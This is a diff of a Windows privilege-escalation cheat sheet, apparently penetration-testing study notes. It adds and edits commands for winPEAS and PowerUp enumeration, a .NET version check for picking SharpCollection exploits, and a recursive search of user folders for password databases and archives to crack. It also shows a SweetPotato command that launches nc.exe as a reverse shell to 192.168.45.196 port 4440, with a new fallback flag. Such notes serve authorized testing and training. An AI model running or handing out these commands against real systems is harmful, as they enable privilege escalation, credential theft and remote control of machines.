@@ -15,7 +15,7 @@ Use batch script on older Windows OS if needed.
 ## winPEAS Run and Copy Output to Z:\downloads\winpeas
 ```
 .\winPEASx64.exe log
-copy .\winpeas.out Z:\downloads\winpeas
+copy .\out.txt Z:\downloads\winpeas\winpeas.out
 ```
 Use `log` for more portable output.
 Then use parsers to convert the output to a better format for viewing outside of the original shell:
@@ -27,6 +27,17 @@ Other popular automated enumeration tools:
 - PowerUp: /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
     - `. .\PowerUp.ps1; Invoke-AllChecks`
 
+## PowerUp.ps1 (Kali Source)
+```
+/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
+```
+
+## PowerUp.ps1 AllChecks
+```
+. .\PowerUp.ps1; Invoke-AllChecks
+```
+
+
 # Build Awareness of Local System
 
 ## Systeminfo
@@ -35,6 +46,7 @@ Other popular automated enumeration tools:
 ```cmd
 systeminfo
 ```
+
 
 ## Show current user privileges
 ```cmd
@@ -48,6 +60,12 @@ Most straightforward win is SeImpersonatePrivilege
 
 
 💭 Do any users have additional privileges that we should target for lateral movement?
+
+## Display DotNet framework version
+```
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+```
+Framework version can determine which exploits we can use, like those from [SharpCollection](https://github.com/Flangvik/SharpCollection).
 
 ## List local users
 ```cmd
@@ -137,7 +155,7 @@ Get-ChildItem -Path env:
 
 ## Search for files
 ```powershell
-Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe,*.zip -Recurse -ErrorAction SilentlyContinue
 ```
 - .exe -> Use `strings` or a decompiler to extract hardcoded credentials
 - .kdbx -> `ssh2john` -> Crack with `john`
@@ -328,6 +346,7 @@ https://github.com/CCob/SweetPotato
 ```cmd
 .\SweetPotato.exe -p .\nc.exe -a "192.168.45.196 4440 -e cmd.exe"
 ```
+Use with `-e EfsRpc` if this fails.
 
 ## RoguePotato (Source)
 ```
